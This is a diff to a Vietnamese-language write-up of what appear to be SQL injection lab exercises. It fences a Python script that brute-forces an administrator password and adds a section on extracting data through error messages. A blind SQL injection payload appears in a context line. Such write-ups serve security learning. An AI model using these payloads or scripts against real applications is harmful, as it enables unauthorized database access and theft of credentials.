@@ -514,6 +514,7 @@ Payload: ' AND (SELECT 1 FROM users WHERE username = 'administrator') = 1--
 
 - Giờ ta sẽ viếp script để brute_force ra password 
 
+```python
 import requests 
 import string 
 
@@ -556,8 +557,12 @@ for i in range(1,21):
         break
 
 print(f"Password is {password}")
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------
+
+- Trích xuất dữ liệu thông qua tin nhắn lỗi hiển thị 
+
+![alt text](image-52.png)
 
 
 
